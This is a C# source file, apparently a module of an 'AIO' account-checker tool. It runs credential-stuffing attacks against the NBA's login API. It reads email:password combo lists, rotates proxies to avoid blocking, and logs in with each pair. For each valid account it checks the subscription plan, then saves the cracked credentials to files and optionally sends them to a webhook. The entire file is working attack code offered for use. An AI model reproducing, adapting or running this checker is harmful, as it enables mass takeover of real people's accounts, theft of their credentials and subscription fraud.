using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class NBAmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            var str = "{\"principal\":\"" + array[0] + "\",\"credential\":\"" + array[1] +
                                      "\",\"identityType\":\"EMAIL\",\"apps\":[\"responsys\",\"billing\",\"preferences\"]}";
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var strResponse = req.Post("https://audience.nba.com/core/api/1/user/login", str,
                                "application/json").ToString();
                            {
                                if (strResponse.Contains("User credentials are invalid"))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else if (strResponse.Contains("responsys.manage")) //hit
                                {
                                    var b = strResponse;
                                    req.AddHeader("Authorization", b);
                                    var cap = req.Get("https://audience.nba.com/regwall/api/1/subscriptions/active")
                                        .ToString();
                                    if (cap.Contains("{\"subscriptions\":[]}"))
                                    {
                                        Program.Frees++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Nba_frees", array[0] + ":" + array[1]);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintFree("Nba frees", array[0] + ":" + array[1]);
                                    }
                                    else
                                    {
                                        try
                                        {
                                            var Plan = Parse(cap, "description\":", ",\"");
                                            Program.Hits++;
                                            Program.TotalChecks++;
                                            Export.AsResult("/Nba_hits",
                                                array[0] + ":" + array[1] + " | Plan: " + Plan);
                                            if (Program.lorc == "LOG")
                                                Settings.PrintHit("Nba",
                                                    array[0] + ":" + array[1] + " | Plan: " + Plan);
                                            if (Settings.sendToWebhook)
                                                Settings.sendTowebhook1(array[0] + ":" + array[1] + " | Plan: " + Plan,
                                                    "NBA Hits");
                                        }
                                        catch
                                        {
                                            Program.Hits++;
                                            Program.TotalChecks++;
                                            Export.AsResult("/Nba_hits_cap_err",
                                                array[0] + ":" + array[1] + " | Plan: " + "Cap Error");
                                            if (Settings.sendToWebhook)
                                                Settings.sendTowebhook1(array[0] + ":" + array[1], "NBA Hits");
                                        }
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                            req.Dispose();
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}